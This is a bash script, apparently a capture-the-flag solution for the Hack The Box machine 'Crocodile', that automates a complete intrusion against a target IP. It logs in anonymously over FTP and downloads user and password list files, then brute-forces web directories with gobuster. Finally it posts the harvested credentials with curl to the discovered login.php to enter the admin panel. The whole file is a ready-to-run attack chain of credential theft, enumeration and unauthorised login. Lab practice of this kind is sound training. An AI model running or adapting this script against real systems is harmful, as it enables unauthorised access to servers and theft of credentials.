#!/usr/bin/env bash
# Extract FTP creds and test web login for HTB Crocodile
# Usage: ./enum-crocodile.sh <TARGET_IP>

set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <TARGET_IP>"
  exit 1
fi

IP=$1
OUT=artifacts-croc
mkdir -p "$OUT"

echo "[*] FTP anonymous login & file download..."
ftp -n "$IP" <<EOF
user anonymous ""
dir
get allowed.userlist
get allowed.userlist.passwd
quit
EOF

echo "[*] Credentials extracted:"
USER=$(head -n1 allowed.userlist)
PASS=$(head -n1 allowed.userlist.passwd)
echo "User: $USER"
echo "Pass: $PASS"

echo "[*] Directory busting for login.php..."
gobuster dir -u "http://$IP/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html \
  -o "$OUT/gobuster.txt"

LOGIN=$(grep login.php "$OUT/gobuster.txt" | awk '{print $1}')
echo "[*] Found login page: $LOGIN"

echo "[*] Logging into admin panel..."
curl -s -d "username=$USER&password=$PASS" "http://$IP$LOGIN" -o "$OUT/admin.html"

echo "[*] Done! Check $OUT/admin.html for the flag."
